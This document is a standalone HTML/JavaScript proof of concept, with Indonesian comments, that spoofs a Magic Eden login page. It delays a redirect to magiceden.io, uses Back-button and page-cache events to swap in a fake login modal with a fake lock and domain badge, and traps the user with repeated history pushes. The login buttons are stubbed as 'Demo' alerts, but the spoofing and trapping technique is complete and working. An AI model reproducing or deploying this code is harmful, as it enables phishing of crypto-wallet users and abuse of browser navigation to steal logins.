<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Magic Eden Back-Button Login Spoof (Race Delay)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root{
      --bg:#0d0d0f; --panel:#111318; --muted:#9aa0a6; --fg:#fff; --accent:#9b59ff;
      --border:#23262b; --btn:#7a3ff0; --btn2:#1a1d22;
    }
    html,body{height:100%}
    body{
      margin:0;background:var(--bg);color:var(--fg);
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial,sans-serif;
      display:flex;align-items:center;justify-content:center;
    }
    .loader{color:#9aa0a6;font-size:14px}
    .backdrop{
      position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:saturate(140%) blur(2px);
      display:flex;align-items:center;justify-content:center;z-index:9999;
    }
    .modal{
      width:min(92vw,460px);background:var(--panel);border:1px solid var(--border);
      border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.45);padding:22px 22px 16px;
    }
    .modal h2{margin:0 0 16px;font-weight:700;font-size:20px}
    .field{display:flex;gap:10px;margin:10px 0 14px}
    .field input{
      flex:1;background:#15181d;border:1px solid #2a2e35;border-radius:10px;
      padding:12px 14px;color:var(--fg);font-size:15px;outline:none;
    }
    .field input::placeholder{color:#7a8089}
    .primary{
      width:100%;border:0;border-radius:10px;background:var(--btn);
      padding:12px 14px;color:#fff;font-weight:600;font-size:15px;cursor:pointer;
    }
    .or{display:flex;align-items:center;gap:10px;color:#8b9097;font-size:12px;margin:14px 0}
    .or:before,.or:after{content:"";flex:1;height:1px;background:#252a31}
    .me-wallet{
      width:100%;display:flex;align-items:center;justify-content:space-between;
      gap:10px;background:var(--btn2);border:1px solid #2a2e35;color:#d7d9dd;
      border-radius:12px;padding:12px 14px;cursor:pointer;
    }
    .me-wallet strong{font-weight:700;letter-spacing:.2px}
    .footnote{margin-top:14px;color:#717782;font-size:12px;line-height:1.45}
    .tiny{font-size:11px;color:#737a84}
    .header-chip{
      position:fixed;top:12px;left:50%;transform:translateX(-50%);
      background:#0f1115;border:1px solid #262a31;color:#c9ccd1;
      padding:6px 10px;border-radius:999px;font-size:12px;display:flex;gap:6px;align-items:center;z-index:10000;
      box-shadow:0 6px 22px rgba(0,0,0,.35);
    }
    .lock{width:12px;height:12px;border:2px solid #6ee7a1;border-radius:2px;display:inline-block}
  </style>
</head>
<body>
  <div id="status" class="loader">Connecting to magiceden.io…</div>

  <script>
    // === CONFIG ===
    const TARGET = "https://magiceden.io/";      // domain yang ingin terlihat di address bar
    const FLAG   = "me_back_spoof_armed";
    const USE_BACK_TRAP = true;                  // perangkap back setelah spoof tampil
    const RACE_DELAY_MS = 12000;                 // << perpanjang delay di sini (ms)
    const JITTER_MS = 600 + Math.floor(Math.random()*900); // jitter biar tidak konstan

    let navigating = false; // apakah sudah jalan ke TARGET

    function renderSpoof(){
      document.body.innerHTML = `
        <div class="header-chip"><span class="lock"></span><span>magiceden.io</span></div>
        <div class="backdrop">
          <div class="modal" role="dialog" aria-modal="true">
            <h2>Log in or sign up</h2>
            <div class="field">
              <input id="email" type="email" placeholder="Enter your email">
            </div>
            <button class="primary" id="continue">Continue</button>
            <div class="or">OR</div>
            <button class="me-wallet" id="wallets">
              <div><strong>ME Wallet</strong> <span class="tiny">• Earn $ME</span></div>
              <div class="tiny">View all wallets &nbsp;•&nbsp; 510+ available</div>
            </button>
            <div class="footnote">
              If you have not logged in before, you will create a new Magic Eden account.
              By proceeding, you agree to our <u>Terms of Service</u> & <u>Privacy Policy</u>.
            </div>
          </div>
        </div>
      `;
      // Demo only
      document.getElementById('continue').onclick = (e)=>{ e.preventDefault(); alert('Demo: Continue (no action)'); };
      document.getElementById('wallets').onclick  = ()=> alert('Demo: View all wallets (no action)');

      if (USE_BACK_TRAP) {
        history.pushState(null, '', location.href);
        addEventListener('popstate', () => history.pushState(null, '', location.href));
      }
    }

    // 1) Saat kembali dari magiceden.io → tampilkan spoof (BFCache)
    addEventListener('pageshow', () => {
      if (sessionStorage.getItem(FLAG) === 'armed' && !navigating) renderSpoof();
    });

    // 2) FIRST RUN: tunda lama sebelum redirect → berikan kesempatan "race" tekan Back
    (function init(){
      if (sessionStorage.getItem(FLAG) === 'armed') {
        // Sudah kembali dari TARGET → spoof
        renderSpoof();
        return;
      }
      sessionStorage.setItem(FLAG, 'armed');

      // Arm back interceptor SEBELUM redirect: kalau user tekan Back cepat, tampilkan spoof
      history.pushState({armed:true}, '', location.href);
      addEventListener('popstate', (ev) => {
        if (!navigating) {           // masih di halaman ini, belum redirect
          renderSpoof();             // tunjukkan spoof lalu (opsional) trap
          if (USE_BACK_TRAP) history.pushState({trap:true}, '', location.href);
        }
      });

      // Delay panjang + jitter → baru redirect ke TARGET
      setTimeout(()=>{
        navigating = true;
        location.href = TARGET;
      }, RACE_DELAY_MS + JITTER_MS);
    })();
  </script>
</body>
</html>
